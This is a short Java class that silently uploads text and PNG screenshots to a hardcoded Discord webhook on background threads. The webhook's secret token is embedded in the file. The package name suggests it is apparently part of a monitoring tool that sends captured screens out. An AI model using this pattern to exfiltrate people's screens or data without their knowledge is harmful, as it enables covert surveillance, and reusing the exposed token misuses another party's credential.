package com.tom5.monitor;

import okhttp3.*;
import java.io.File;
import java.io.IOException;

public class DiscordSender {
    // رابط الـ Webhook مالتك (لا تغيره)
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1502276149542260797/1J0sisoUXD-qmXucP0ejuvPuN29GFkvdNLuxN9rpRB_vXBEFhn5jQmgFTn03ui6R0qd7";

    public static void sendMessage(String content) {
        new Thread(() -> {
            OkHttpClient client = new OkHttpClient();
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("content", content)
                    .build();

            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            try { 
                Response response = client.newCall(request).execute();
                response.close();
            } catch (IOException e) { e.printStackTrace(); }
        }).start();
    }

    public static void sendPhoto(File file) {
        new Thread(() -> {
            OkHttpClient client = new OkHttpClient();
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", "screenshot.png", 
                            RequestBody.create(MediaType.parse("image/png"), file))
                    .build();

            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            try { 
                Response response = client.newCall(request).execute();
                response.close();
            } catch (IOException e) { e.printStackTrace(); }
        }).start();
    }
}
